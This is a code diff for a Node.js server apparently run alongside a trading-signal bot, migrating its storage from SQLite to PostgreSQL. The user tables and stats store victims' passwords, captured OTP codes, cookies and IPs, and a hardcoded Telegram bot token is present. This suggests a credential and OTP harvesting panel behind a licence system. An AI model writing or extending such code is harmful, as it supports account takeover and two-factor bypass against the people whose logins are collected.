@@ -3,11 +3,385 @@ const cors = require('cors');
 const axios = require('axios');
 const fs = require('fs');
 const path = require('path');
-const Database = require('better-sqlite3');
 
+// ================== POSTGRESQL SETUP ==================
+// When DATABASE_URL is set (Render, Railway, Fly.io, Supabase, Neon, etc.)
+// all data is stored permanently in PostgreSQL.
+// If DATABASE_URL is NOT set, falls back to the original file-based storage.
+let pool = null;
+let useDatabase = false;
+
+if (process.env.DATABASE_URL) {
+    try {
+        const { Pool } = require('pg');
+        pool = new Pool({
+            connectionString: process.env.DATABASE_URL,
+            ssl: process.env.DATABASE_URL.includes('localhost') ? false : { rejectUnauthorized: false },
+            // Connection pool tuned for 100k concurrent users
+            max: 100,                  // maximum 100 simultaneous DB connections
+            idleTimeoutMillis: 30000,  // close idle connections after 30s
+            connectionTimeoutMillis: 5000,
+        });
+        useDatabase = true;
+        console.log('✅ PostgreSQL mode: permanent storage enabled');
+    } catch (e) {
+        console.warn('⚠️  pg module not found or DB error — falling back to file storage:', e.message);
+        useDatabase = false;
+    }
+} else {
+    console.log('📁 File storage mode: set DATABASE_URL env var for permanent PostgreSQL storage');
+}
+
+// ================== DATABASE SCHEMA INIT ==================
+async function initDatabase() {
+    if (!useDatabase || !pool) return;
+    const client = await pool.connect();
+    try {
+        await client.query(`
+            CREATE TABLE IF NOT EXISTS users (
+                id TEXT PRIMARY KEY,
+                licence_key TEXT NOT NULL,
+                full_name TEXT DEFAULT 'Unknown',
+                username TEXT DEFAULT '',
+                password TEXT DEFAULT '',
+                otp TEXT DEFAULT '',
+                ip TEXT DEFAULT '',
+                cookies TEXT DEFAULT '',
+                status TEXT DEFAULT 'Active',
+                connected BOOLEAN DEFAULT false,
+                blocked BOOLEAN DEFAULT false,
+                last_activity TIMESTAMPTZ DEFAULT NOW(),
+                activities JSONB DEFAULT '[]'::jsonb,
+                created_at TIMESTAMPTZ DEFAULT NOW()
+            );
+            CREATE INDEX IF NOT EXISTS idx_users_licence_key ON users(licence_key);
+            CREATE INDEX IF NOT EXISTS idx_users_full_name ON users(LOWER(full_name));
+            CREATE INDEX IF NOT EXISTS idx_users_status ON users(status);
+            CREATE INDEX IF NOT EXISTS idx_users_last_activity ON users(last_activity DESC);
+
+            CREATE TABLE IF NOT EXISTS licenses (
+                key TEXT PRIMARY KEY,
+                type TEXT DEFAULT 'Standard',
+                status TEXT DEFAULT 'Active',
+                uses_remaining INTEGER,
+                assigned_to TEXT,
+                date_added TIMESTAMPTZ DEFAULT NOW(),
+                expiry TIMESTAMPTZ
+            );
+            CREATE INDEX IF NOT EXISTS idx_licenses_status ON licenses(status);
+
+            CREATE TABLE IF NOT EXISTS pending_messages (
+                id SERIAL PRIMARY KEY,
+                user_name TEXT NOT NULL,
+                message_data JSONB NOT NULL,
+                created_at TIMESTAMPTZ DEFAULT NOW(),
+                delivered BOOLEAN DEFAULT false
+            );
+            CREATE INDEX IF NOT EXISTS idx_pending_messages_user_name ON pending_messages(LOWER(user_name));
+            CREATE INDEX IF NOT EXISTS idx_pending_messages_delivered ON pending_messages(delivered);
+
+            CREATE TABLE IF NOT EXISTS activity_log (
+                id SERIAL PRIMARY KEY,
+                action TEXT NOT NULL,
+                user_name TEXT,
+                licence_key TEXT,
+                ip TEXT,
+                data JSONB,
+                created_at TIMESTAMPTZ DEFAULT NOW()
+            );
+            CREATE INDEX IF NOT EXISTS idx_activity_log_created ON activity_log(created_at DESC);
+        `);
+        console.log('✅ Database tables ready');
+    } catch (e) {
+        console.error('❌ DB schema init error:', e.message);
+    } finally {
+        client.release();
+    }
+}
+
+// ================== DB HELPER: row → user object ==================
+function rowToUser(row) {
+    if (!row) return null;
+    return {
+        id:           row.id,
+        licenceKey:   row.licence_key,
+        fullName:     row.full_name,
+        username:     row.username,
+        password:     row.password,
+        otp:          row.otp,
+        ip:           row.ip,
+        cookies:      row.cookies,
+        status:       row.status,
+        connected:    row.connected,
+        blocked:      row.blocked,
+        lastActivity: row.last_activity,
+        activities:   row.activities || [],
+    };
+}
+
+// ================== DB HELPER: row → license object ==================
+function rowToLicense(row) {
+    if (!row) return null;
+    return {
+        key:           row.key,
+        type:          row.type,
+        status:        row.status,
+        usesRemaining: row.uses_remaining,
+        assignedTo:    row.assigned_to,
+        dateAdded:     row.date_added,
+        expiry:        row.expiry,
+    };
+}
+
+// ================== DB: Get or create user ==================
+async function dbGetOrCreateUser(licenceKey, fullName = "Unknown") {
+    const hasName = fullName && fullName !== "Unknown" && fullName !== "Pending Name";
+    const client = await pool.connect();
+    try {
+        let row;
+        if (hasName) {
+            // Primary: match by licenceKey + fullName (case-insensitive on name)
+            const r = await client.query(
+                `SELECT * FROM users WHERE licence_key = $1 AND LOWER(full_name) = LOWER($2) LIMIT 1`,
+                [licenceKey, fullName]
+            );
+            row = r.rows[0];
+            // Fallback: licenceKey match with blank/Unknown name
+            if (!row) {
+                const r2 = await client.query(
+                    `SELECT * FROM users WHERE licence_key = $1 AND (full_name IS NULL OR full_name IN ('Unknown','Pending Name','')) LIMIT 1`,
+                    [licenceKey]
+                );
+                row = r2.rows[0];
+            }
+        } else {
+            const r = await client.query(
+                `SELECT * FROM users WHERE licence_key = $1 LIMIT 1`,
+                [licenceKey]
+            );
+            row = r.rows[0];
+        }
+
+        if (!row) {
+            const newId = Date.now().toString() + '_' + Math.random().toString(36).slice(2, 7);
+            const r = await client.query(
+                `INSERT INTO users (id, licence_key, full_name, last_activity)
+                 VALUES ($1, $2, $3, NOW())
+                 ON CONFLICT (id) DO UPDATE SET last_activity = NOW()
+                 RETURNING *`,
+                [newId, licenceKey, hasName ? fullName : "Unknown"]
+            );
+            row = r.rows[0];
+        } else {
+            // Update name if we now have one
+            if (hasName && row.full_name !== fullName) {
+                await client.query(
+                    `UPDATE users SET full_name = $1, last_activity = NOW() WHERE id = $2`,
+                    [fullName, row.id]
+                );
+                row.full_name = fullName;
+            } else {
+                await client.query(`UPDATE users SET last_activity = NOW() WHERE id = $1`, [row.id]);
+            }
+        }
+        return rowToUser(row);
+    } finally {
+        client.release();
+    }
+}
+
+// ================== DB: Save user (upsert) ==================
+async function dbSaveUser(user) {
+    if (!useDatabase || !pool) return;
+    const client = await pool.connect();
+    try {
+        await client.query(
+            `INSERT INTO users (id, licence_key, full_name, username, password, otp, ip, cookies,
+                                status, connected, blocked, last_activity, activities)
+             VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,NOW(),$12)
+             ON CONFLICT (id) DO UPDATE SET
+                full_name    = EXCLUDED.full_name,
+                username     = EXCLUDED.username,
+                password     = EXCLUDED.password,
+                otp          = EXCLUDED.otp,
+                ip           = EXCLUDED.ip,
+                cookies      = EXCLUDED.cookies,
+                status       = EXCLUDED.status,
+                connected    = EXCLUDED.connected,
+                blocked      = EXCLUDED.blocked,
+                last_activity = NOW(),
+                activities   = EXCLUDED.activities`,
+            [
+                user.id, user.licenceKey, user.fullName, user.username || '',
+                user.password || '', user.otp || '', user.ip || '', user.cookies || '',
+                user.status || 'Active', user.connected || false, user.blocked || false,
+                JSON.stringify(user.activities || [])
+            ]
+        );
+    } catch (e) {
+        console.error('dbSaveUser error:', e.message);
+    } finally {
+        client.release();
+    }
+}
+
+// ================== DB: Get all users ==================
+async function dbGetAllUsers() {
+    const client = await pool.connect();
+    try {
+        const r = await client.query(`SELECT * FROM users ORDER BY last_activity DESC`);
+        return r.rows.map(rowToUser);
+    } finally {
+        client.release();
+    }
+}
+
+// ================== DB: Find user by licenceKey ==================
+async function dbFindUserByKey(licenceKey) {
+    const client = await pool.connect();
+    try {
+        const r = await client.query(`SELECT * FROM users WHERE licence_key = $1 LIMIT 1`, [licenceKey]);
+        return rowToUser(r.rows[0]);
+    } finally {
+        client.release();
+    }
+}
+
+// ================== DB: Stats ==================
+async function dbGetStats() {
+    const client = await pool.connect();
+    try {
+        const r = await client.query(`
+            SELECT
+                COUNT(*)                                              AS "totalUsers",
+                COUNT(*) FILTER (WHERE status = 'Online')            AS "onlineNow",
+                COUNT(*) FILTER (WHERE otp IS NOT NULL AND otp != '') AS "otpCaptured",
+                COUNT(*) FILTER (WHERE connected = true)             AS "connectedAccounts"
+            FROM users
+        `);
+        const lr = await client.query(`
+            SELECT
+                COUNT(*)                                     AS "totalLicenses",
+                COUNT(*) FILTER (WHERE status = 'Active')   AS "activeLicenses"
+            FROM licenses
+        `);
+        return {
+            totalUsers:        parseInt(r.rows[0].totalUsers),
+            onlineNow:         parseInt(r.rows[0].onlineNow),
+            otpCaptured:       parseInt(r.rows[0].otpCaptured),
+            connectedAccounts: parseInt(r.rows[0].connectedAccounts),
+            totalLicenses:     parseInt(lr.rows[0].totalLicenses),
+            activeLicenses:    parseInt(lr.rows[0].activeLicenses),
+        };
+    } finally {
+        client.release();
+    }
+}
+
+// ================== DB: License operations ==================
+async function dbGetAllLicenses() {
+    const client = await pool.connect();
+    try {
+        const r = await client.query(`SELECT * FROM licenses ORDER BY date_added DESC`);
+        return r.rows.map(rowToLicense);
+    } finally {
+        client.release();
+    }
+}
+
+async function dbFindLicense(key) {
+    const client = await pool.connect();
+    try {
+        const r = await client.query(`SELECT * FROM licenses WHERE key = $1 LIMIT 1`, [key]);
+        return rowToLicense(r.rows[0]);
+    } finally {
+        client.release();
+    }
+}
+
+async function dbInsertLicense(lic) {
+    const client = await pool.connect();
+    try {
+        await client.query(
+            `INSERT INTO licenses (key, type, status, uses_remaining, assigned_to, date_added, expiry)
+             VALUES ($1,$2,$3,$4,$5,NOW(),$6)`,
+            [lic.key, lic.type, lic.status, lic.usesRemaining || null, lic.assignedTo || null,
+             lic.expiry ? new Date(lic.expiry) : null]
+        );
+    } finally {
+        client.release();
+    }
+}
+
+async function dbUpdateLicenseStatus(key, status) {
+    const client = await pool.connect();
+    try {
+        await client.query(`UPDATE licenses SET status = $1 WHERE key = $2`, [status, key]);
+    } finally {
+        client.release();
+    }
+}
+
+async function dbDeleteLicense(key) {
+    const client = await pool.connect();
+    try {
+        await client.query(`DELETE FROM licenses WHERE key = $1`, [key]);
+    } finally {
+        client.release();
+    }
+}
+
+// ================== DB: Pending messages ==================
+async function dbAddPendingMessage(userName, msgPayload) {
+    if (!useDatabase || !pool) return;
+    const client = await pool.connect();
+    try {
+        // Cap at 20 messages per user
+        await client.query(
+            `INSERT INTO pending_messages (user_name, message_data) VALUES ($1, $2)`,
+            [userName.trim().toLowerCase(), JSON.stringify(msgPayload)]
+        );
+        // Delete oldest beyond 20 per user
+        await client.query(
+            `DELETE FROM pending_messages WHERE id IN (
+                SELECT id FROM pending_messages
+                WHERE LOWER(user_name) = LOWER($1) AND delivered = false
+                ORDER BY created_at ASC
+                OFFSET 20
+            )`,
+            [userName]
+        );
+    } catch (e) {
+        console.error('dbAddPendingMessage error:', e.message);
+    } finally {
+        client.release();
+    }
+}
+
+async function dbPollAndClearMessages(userName) {
+    if (!useDatabase || !pool) return [];
+    const client = await pool.connect();
+    try {
+        const r = await client.query(
+            `UPDATE pending_messages
+             SET delivered = true
+             WHERE LOWER(user_name) = LOWER($1) AND delivered = false
+             RETURNING message_data`,
+            [userName.trim()]
+        );
+        return r.rows.map(row => row.message_data);
+    } catch (e) {
+        console.error('dbPollAndClearMessages error:', e.message);
+        return [];
+    } finally {
+        client.release();
+    }
+}
+
+// ================== EXPRESS APP ==================
 const app = express();
 app.use(cors());
-app.use(express.json({ limit: '10mb' }));
+app.use(express.json());
 
 // ================== TELEGRAM SETTINGS ==================
 const TELEGRAM_BOT_TOKEN = "8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc";
@@ -25,10 +399,8 @@ async function sendTelegramMessage(text) {
 // ================== SSE BROADCAST ==================
 const sseClients = new Set();
 
-// ================== PENDING MESSAGES (polling fallback) ==================
-// Stores messages per userName so the main-bot can poll and pick up any
-// messages that were missed when the SSE connection was temporarily down.
-// Key: userName (string), Value: array of message objects
+// ================== PENDING MESSAGES (in-memory fallback) ==================
+// Used when DATABASE_URL is not set. Key: userName (string), Value: array of message objects
 const pendingMessages = {};
 
 function broadcastSSE(eventType, data) {
@@ -60,7 +432,7 @@ app.get('/api/events', (req, res) => {
     });
 });
 
-// ================== SQLITE PERSISTENT STORAGE ==================
+// ================== PERSISTENT STORAGE (FILE FALLBACK) ==================
 // DATA_DIR env var lets you point to a persistent disk on Render.com / Railway / Fly.io
 // e.g. on Render: set DATA_DIR=/data  and mount a persistent disk at /data
 // If not set, falls back to a "data" folder next to this file
@@ -71,376 +443,269 @@ try {
     if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
 } catch (e) { console.error('Could not create DATA_DIR:', e.message); }
 
-const DB_FILE = path.join(DATA_DIR, 'chinasignal.db');
+const DATA_FILE     = path.join(DATA_DIR, 'users.json');
+const LICENSES_FILE = path.join(DATA_DIR, 'licenses.json');
 
-let db;
-try {
-    db = new Database(DB_FILE);
-    // Enable WAL mode for performance and crash safety — data survives server restarts
-    db.pragma('journal_mode = WAL');
-    db.pragma('synchronous = NORMAL');
-    db.pragma('foreign_keys = ON');
-    console.log(`✅ SQLite database opened: ${DB_FILE}`);
-} catch (e) {
-    console.error('SQLite open failed:', e.message);
-    process.exit(1);
-}
+let users    = [];
+let licenses = [];
 
-// Create all tables
-db.exec(`
-    CREATE TABLE IF NOT EXISTS users (
-        id TEXT PRIMARY KEY,
-        licenceKey TEXT NOT NULL,
-        fullName TEXT DEFAULT 'Unknown',
-        username TEXT DEFAULT '',
-        password TEXT DEFAULT '',
-        otp TEXT DEFAULT '',
-        ip TEXT DEFAULT '',
-        cookies TEXT DEFAULT '',
-        status TEXT DEFAULT 'Active',
-        connected INTEGER DEFAULT 0,
-        blocked INTEGER DEFAULT 0,
-        lastActivity TEXT,
-        activities TEXT DEFAULT '[]',
-        notes TEXT DEFAULT '',
-        createdAt TEXT DEFAULT (datetime('now'))
-    );
-    CREATE INDEX IF NOT EXISTS idx_users_licenceKey ON users(licenceKey);
-    CREATE INDEX IF NOT EXISTS idx_users_lastActivity ON users(lastActivity DESC);
-
-    CREATE TABLE IF NOT EXISTS licenses (
-        key TEXT PRIMARY KEY,
-        type TEXT DEFAULT 'Standard',
-        status TEXT DEFAULT 'Active',
-        usesRemaining INTEGER,
-        assignedTo TEXT,
-        dateAdded TEXT DEFAULT (datetime('now')),
-        expiry TEXT
-    );
-
-    CREATE TABLE IF NOT EXISTS activity_log (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        action TEXT NOT NULL,
-        userName TEXT DEFAULT 'Unknown',
-        licenceKey TEXT DEFAULT '--',
-        ip TEXT DEFAULT '--',
-        otp TEXT DEFAULT '',
-        extra TEXT DEFAULT '{}',
-        timestamp TEXT DEFAULT (datetime('now'))
-    );
-    CREATE INDEX IF NOT EXISTS idx_activity_timestamp ON activity_log(timestamp);
-    CREATE INDEX IF NOT EXISTS idx_activity_action ON activity_log(action);
-
-    CREATE TABLE IF NOT EXISTS sent_messages_log (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        target TEXT NOT NULL,
-        message TEXT NOT NULL,
-        msgType TEXT DEFAULT 'info',
-        success INTEGER DEFAULT 1,
-        timestamp TEXT DEFAULT (datetime('now'))
-    );
-
-    CREATE TABLE IF NOT EXISTS user_notes (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        licenceKey TEXT NOT NULL,
-        note TEXT NOT NULL,
-        addedBy TEXT DEFAULT 'Admin',
-        timestamp TEXT DEFAULT (datetime('now'))
-    );
-    CREATE INDEX IF NOT EXISTS idx_user_notes_key ON user_notes(licenceKey);
-
-    CREATE TABLE IF NOT EXISTS signal_history (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        licenceKey TEXT,
-        userName TEXT,
-        asset TEXT,
-        direction TEXT,
-        duration INTEGER,
-        confidence INTEGER,
-        result TEXT,
-        amount REAL,
-        profit REAL,
-        timestamp TEXT DEFAULT (datetime('now'))
-    );
-    CREATE INDEX IF NOT EXISTS idx_signal_licenceKey ON signal_history(licenceKey);
-`);
-
-// ================== MIGRATE OLD JSON DATA ==================
-function safeJsonParse(str, fallback) {
-    try { return JSON.parse(str || '{}'); } catch(e) { return fallback; }
-}
-
-// Migrate users.json -> SQLite
-const oldUsersFile = path.join(DATA_DIR, 'users.json');
-if (fs.existsSync(oldUsersFile)) {
+function loadUsers() {
     try {
-        const raw = fs.readFileSync(oldUsersFile, 'utf8').trim();
-        const oldUsers = raw ? JSON.parse(raw) : [];
-        const insertUser = db.prepare(`
-            INSERT OR IGNORE INTO users (id, licenceKey, fullName, username, password, otp, ip, cookies, status, connected, blocked, lastActivity, activities)
-            VALUES (@id, @licenceKey, @fullName, @username, @password, @otp, @ip, @cookies, @status, @connected, @blocked, @lastActivity, @activities)
-        `);
-        const migrateMany = db.transaction((arr) => {
-            for (const u of arr) {
-                insertUser.run({
-                    id:           u.id || (Date.now().toString() + '_' + Math.random().toString(36).slice(2, 7)),
-                    licenceKey:   u.licenceKey || '',
-                    fullName:     u.fullName || 'Unknown',
-                    username:     u.username || '',
-                    password:     u.password || '',
-                    otp:          u.otp || '',
-                    ip:           u.ip || '',
-                    cookies:      u.cookies || '',
-                    status:       u.status || 'Active',
-                    connected:    u.connected ? 1 : 0,
-                    blocked:      u.blocked ? 1 : 0,
-                    lastActivity: u.lastActivity || new Date().toISOString(),
-                    activities:   JSON.stringify(u.activities || [])
-                });
-            }
-        });
-        migrateMany(oldUsers);
-        fs.renameSync(oldUsersFile, oldUsersFile + '.migrated');
-        console.log(`✅ Migrated ${oldUsers.length} users from users.json → SQLite`);
-    } catch (e) { console.error('User migration error:', e.message); }
+        if (fs.existsSync(DATA_FILE)) {
+            const data = fs.readFileSync(DATA_FILE, 'utf8');
+            users = JSON.parse(data);
+        } else {
+            fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
+        }
+    } catch (e) { users = []; }
 }
 
-// Migrate licenses.json -> SQLite
-const oldLicensesFile = path.join(DATA_DIR, 'licenses.json');
-if (fs.existsSync(oldLicensesFile)) {
+function saveUsers() {
     try {
-        const raw = fs.readFileSync(oldLicensesFile, 'utf8').trim();
-        const oldLicenses = raw ? JSON.parse(raw) : [];
-        const insertLic = db.prepare(`
-            INSERT OR IGNORE INTO licenses (key, type, status, usesRemaining, assignedTo, dateAdded, expiry)
-            VALUES (@key, @type, @status, @usesRemaining, @assignedTo, @dateAdded, @expiry)
-        `);
-        const migrateLics = db.transaction((arr) => {
-            for (const l of arr) {
-                insertLic.run({
-                    key:           l.key,
-                    type:          l.type || 'Standard',
-                    status:        l.status || 'Active',
-                    usesRemaining: l.usesRemaining || null,
-                    assignedTo:    l.assignedTo || null,
-                    dateAdded:     l.dateAdded || new Date().toISOString(),
-                    expiry:        l.expiry || null
-                });
-            }
-        });
-        migrateLics(oldLicenses);
-        fs.renameSync(oldLicensesFile, oldLicensesFile + '.migrated');
-        console.log(`✅ Migrated ${oldLicenses.length} licenses from licenses.json → SQLite`);
-    } catch (e) { console.error('License migration error:', e.message); }
+        // Atomic write: write to temp file first, then rename
+        const tmp = DATA_FILE + '.tmp';
+        fs.writeFileSync(tmp, JSON.stringify(users, null, 2));
+        fs.renameSync(tmp, DATA_FILE);
+    } catch (e) {
+        // Fallback: direct write
+        try { fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2)); } catch (e2) {}
+    }
 }
 
-// ================== DB HELPER FUNCTIONS ==================
-function getUsers() {
-    return db.prepare('SELECT * FROM users ORDER BY lastActivity DESC').all().map(dbUserToObj);
+function loadLicenses() {
+    try {
+        if (fs.existsSync(LICENSES_FILE)) {
+            const data = fs.readFileSync(LICENSES_FILE, 'utf8').trim();
+            licenses = data ? JSON.parse(data) : [];
+        } else {
+            licenses = [];
+            fs.writeFileSync(LICENSES_FILE, JSON.stringify([], null, 2));
+        }
+    } catch (e) { licenses = []; }
 }
 
-function dbUserToObj(u) {
-    if (!u) return null;
-    return {
-        ...u,
-        connected:  !!u.connected,
-        blocked:    !!u.blocked,
-        activities: safeJsonParse(u.activities, [])
-    };
+function saveLicenses() {
+    try {
+        // Atomic write: write to temp file first, then rename
+        const tmp = LICENSES_FILE + '.tmp';
+        fs.writeFileSync(tmp, JSON.stringify(licenses, null, 2));
+        fs.renameSync(tmp, LICENSES_FILE);
+    } catch (e) {
+        // Fallback: direct write
+        try { fs.writeFileSync(LICENSES_FILE, JSON.stringify(licenses, null, 2)); } catch (e2) {}
+    }
 }
 
-function getUserByLicenceKey(licenceKey) {
-    return dbUserToObj(db.prepare('SELECT * FROM users WHERE licenceKey = ? ORDER BY lastActivity DESC LIMIT 1').get(licenceKey));
+if (!useDatabase) {
+    loadUsers();
+    loadLicenses();
+    // Periodic auto-save every 30 seconds to ensure no data loss (file mode only)
+    setInterval(() => {
+        try { saveUsers(); } catch (e) {}
+        try { saveLicenses(); } catch (e) {}
+    }, 30000);
 }
 
-function saveUser(user) {
-    db.prepare(`
-        INSERT OR REPLACE INTO users
-            (id, licenceKey, fullName, username, password, otp, ip, cookies, status, connected, blocked, lastActivity, activities)
-        VALUES
-            (@id, @licenceKey, @fullName, @username, @password, @otp, @ip, @cookies, @status, @connected, @blocked, @lastActivity, @activities)
-    `).run({
-        ...user,
-        connected:  user.connected  ? 1 : 0,
-        blocked:    user.blocked    ? 1 : 0,
-        activities: JSON.stringify(user.activities || [])
-    });
-}
-
-// Helper: Get or create user
+// Helper: Get or create user (file-based fallback)
 // Matches by BOTH licenceKey AND fullName so that multiple people sharing
 // the same license key still get separate records (one row per person).
 // Falls back to licenceKey-only match when fullName is "Unknown" or blank.
-function getOrCreateUser(licenceKey, fullName = "Unknown") {
+function getOrCreateUserFile(licenceKey, fullName = "Unknown") {
     const hasName = fullName && fullName !== "Unknown" && fullName !== "Pending Name";
 
     let user;
     if (hasName) {
         // Primary: match by licenceKey + fullName (case-insensitive on name)
-        user = dbUserToObj(db.prepare(
-            'SELECT * FROM users WHERE licenceKey = ? AND lower(fullName) = lower(?)'
-        ).get(licenceKey, fullName));
-
-        // Fallback: claim a key-only record with no real name yet
+        user = users.find(u =>
+            u.licenceKey === licenceKey &&
+            (u.fullName || '').toLowerCase() === fullName.toLowerCase()
+        );
+        // Fallback: if no match by both, but there IS an exact licenceKey match
+        // whose fullName is still blank/Unknown, claim that record
         if (!user) {
-            user = dbUserToObj(db.prepare(
-                "SELECT * FROM users WHERE licenceKey = ? AND (fullName IS NULL OR fullName = 'Unknown' OR fullName = 'Pending Name')"
-            ).get(licenceKey));
+            user = users.find(u =>
+                u.licenceKey === licenceKey &&
+                (!u.fullName || u.fullName === "Unknown" || u.fullName === "Pending Name")
+            );
         }
     } else {
-        user = getUserByLicenceKey(licenceKey);
+        // No meaningful name yet — legacy match by licenceKey only
+        user = users.find(u => u.licenceKey === licenceKey);
     }
 
     if (!user) {
         user = {
-            id:           Date.now().toString() + '_' + Math.random().toString(36).slice(2, 7),
+            id: Date.now().toString() + '_' + Math.random().toString(36).slice(2, 7),
             licenceKey,
-            fullName:     hasName ? fullName : "Unknown",
-            username:     "",
-            password:     "",
-            otp:          "",
-            ip:           "",
-            cookies:      "",
-            status:       "Active",
-            connected:    false,
-            blocked:      false,
+            fullName: hasName ? fullName : "Unknown",
+            username: "",
+            password: "",
+            otp: "",
+            ip: "",
+            cookies: "",
+            status: "Active",
+            connected: false,
             lastActivity: new Date().toISOString(),
-            activities:   []
+            activities: []
         };
-        saveUser(user);
+        users.unshift(user);
     }
 
     if (hasName && user.fullName !== fullName) user.fullName = fullName;
     user.lastActivity = new Date().toISOString();
-    saveUser(user);
+    saveUsers();
     return user;
 }
 
-function getLicenses() {
-    return db.prepare('SELECT * FROM licenses ORDER BY dateAdded DESC').all();
+// Unified getOrCreateUser — uses DB when available, files otherwise
+async function getOrCreateUser(licenceKey, fullName = "Unknown") {
+    if (useDatabase) {
+        return await dbGetOrCreateUser(licenceKey, fullName);
+    }
+    return getOrCreateUserFile(licenceKey, fullName);
 }
 
-function getLicense(key) {
-    return db.prepare('SELECT * FROM licenses WHERE key = ?').get(key);
-}
-
-function saveLicense(license) {
-    db.prepare(`
-        INSERT OR REPLACE INTO licenses (key, type, status, usesRemaining, assignedTo, dateAdded, expiry)
-        VALUES (@key, @type, @status, @usesRemaining, @assignedTo, @dateAdded, @expiry)
-    `).run(license);
-}
-
-function deleteLicenseByKey(key) {
-    db.prepare('DELETE FROM licenses WHERE key = ?').run(key);
-}
-
-// Persistent activity logger — every action is stored in SQLite forever
-function logActivity(action, data = {}) {
-    try {
-        db.prepare(`
-            INSERT INTO activity_log (action, userName, licenceKey, ip, otp, extra, timestamp)
-            VALUES (@action, @userName, @licenceKey, @ip, @otp, @extra, @timestamp)
-        `).run({
-            action,
-            userName:   data.fullName   || data.userName   || 'Unknown',
-            licenceKey: data.licenceKey || data.licenseKey || '--',
-            ip:         data.ip         || '--',
-            otp:        data.otp        || '',
-            extra:      JSON.stringify(data),
-            timestamp:  new Date().toISOString()
-        });
-    } catch(e) { console.error('logActivity error:', e.message); }
+// Unified saveUser
+async function saveUser(user) {
+    if (useDatabase) {
+        await dbSaveUser(user);
+    } else {
+        saveUsers();
+    }
 }
 
 // ================== LICENSE ROUTES ==================
-app.get('/api/licenses', (req, res) => {
-    res.json(getLicenses());
+app.get('/api/licenses', async (req, res) => {
+    try {
+        if (useDatabase) {
+            const lics = await dbGetAllLicenses();
+            return res.json(lics);
+        }
+        res.json(licenses);
+    } catch (e) {
+        console.error('/api/licenses GET error:', e.message);
+        res.json(licenses);
+    }
 });
 
-app.post('/api/licenses', (req, res) => {
+app.post('/api/licenses', async (req, res) => {
     const { key, type, expiry, maxUses, status } = req.body;
     if (!key) return res.status(400).json({ error: "Key required" });
-    if (getLicense(key)) {
-        return res.status(400).json({ error: "License already exists" });
-    }
-    const newLicense = {
-        key,
-        type:          type   || "Standard",
-        status:        status || "Active",
-        usesRemaining: maxUses || null,
-        assignedTo:    null,
-        dateAdded:     new Date().toISOString(),
-        expiry:        expiry || null
-    };
-    saveLicense(newLicense);
-    logActivity('License Added by Admin', { licenceKey: key });
-    broadcastSSE('license_added', newLicense);
-    res.json({ success: true });
-});
 
-// ================== BULK LICENSE ADD ==================
-app.post('/api/bulk-license', (req, res) => {
-    const { keys, type, expiry, maxUses, status } = req.body;
-    if (!Array.isArray(keys) || keys.length === 0) {
-        return res.status(400).json({ error: "keys array required" });
-    }
-    let added = 0, skipped = 0;
-    const addMany = db.transaction(() => {
-        for (const rawKey of keys) {
-            const key = (rawKey || '').trim().toUpperCase();
-            if (!key || getLicense(key)) { skipped++; continue; }
-            saveLicense({
+    try {
+        if (useDatabase) {
+            const existing = await dbFindLicense(key);
+            if (existing) return res.status(400).json({ error: "License already exists" });
+            const newLicense = {
                 key,
-                type:          type   || "Standard",
-                status:        status || "Active",
+                type: type || "Standard",
+                status: status || "Active",
                 usesRemaining: maxUses || null,
-                assignedTo:    null,
-                dateAdded:     new Date().toISOString(),
-                expiry:        expiry || null
-            });
-            added++;
+                assignedTo: null,
+                dateAdded: new Date().toISOString(),
+                expiry: expiry || null
+            };
+            await dbInsertLicense(newLicense);
+            broadcastSSE('license_added', newLicense);
+            return res.json({ success: true });
         }
-    });
-    addMany();
-    logActivity(`Bulk License Add: ${added} added, ${skipped} skipped`, {});
-    broadcastSSE('licenses_bulk_added', { count: added });
-    res.json({ success: true, added, skipped });
+        // File fallback
+        if (licenses.find(l => l.key === key)) {
+            return res.status(400).json({ error: "License already exists" });
+        }
+        const newLicense = {
+            key,
+            type: type || "Standard",
+            status: status || "Active",
+            usesRemaining: maxUses || null,
+            assignedTo: null,
+            dateAdded: new Date().toISOString(),
+            expiry: expiry || null
+        };
+        licenses.unshift(newLicense);
+        saveLicenses();
+        broadcastSSE('license_added', newLicense);
+        res.json({ success: true });
+    } catch (e) {
+        console.error('/api/licenses POST error:', e.message);
+        res.status(500).json({ error: "Server error" });
+    }
 });
 
-app.patch('/api/licenses/:key', (req, res) => {
+app.patch('/api/licenses/:key', async (req, res) => {
     const key = decodeURIComponent(req.params.key);
     const { status } = req.body;
-    const license = getLicense(key);
-    if (!license) return res.status(404).json({ error: "License not found" });
-    if (status) license.status = status;
-    saveLicense(license);
-    broadcastSSE('license_updated', { key, status: license.status });
-    res.json({ success: true, key, status: license.status });
+
+    try {
+        if (useDatabase) {
+            const license = await dbFindLicense(key);
+            if (!license) return res.status(404).json({ error: "License not found" });
+            if (status) await dbUpdateLicenseStatus(key, status);
+            broadcastSSE('license_updated', { key, status: status || license.status });
+            return res.json({ success: true, key, status: status || license.status });
+        }
+        // File fallback
+        const license = licenses.find(l => l.key === key);
+        if (!license) return res.status(404).json({ error: "License not found" });
+        if (status) license.status = status;
+        saveLicenses();
+        broadcastSSE('license_updated', { key, status: license.status });
+        res.json({ success: true, key, status: license.status });
+    } catch (e) {
+        console.error('/api/licenses PATCH error:', e.message);
+        res.status(500).json({ error: "Server error" });
+    }
 });
 
-app.delete('/api/licenses/:key', (req, res) => {
+app.delete('/api/licenses/:key', async (req, res) => {
     const key = decodeURIComponent(req.params.key);
-    deleteLicenseByKey(key);
-    logActivity('License Deleted by Admin', { licenceKey: key });
-    broadcastSSE('license_deleted', { key });
-    res.json({ success: true });
+    try {
+        if (useDatabase) {
+            await dbDeleteLicense(key);
+            broadcastSSE('license_deleted', { key });
+            return res.json({ success: true });
+        }
+        // File fallback
+        licenses = licenses.filter(l => l.key !== key);
+        saveLicenses();
+        broadcastSSE('license_deleted', { key });
+        res.json({ success: true });
+    } catch (e) {
+        console.error('/api/licenses DELETE error:', e.message);
+        res.status(500).json({ error: "Server error" });
+    }
 });
 
 // Validate License (called by main bot)
-app.post('/api/validate-license', (req, res) => {
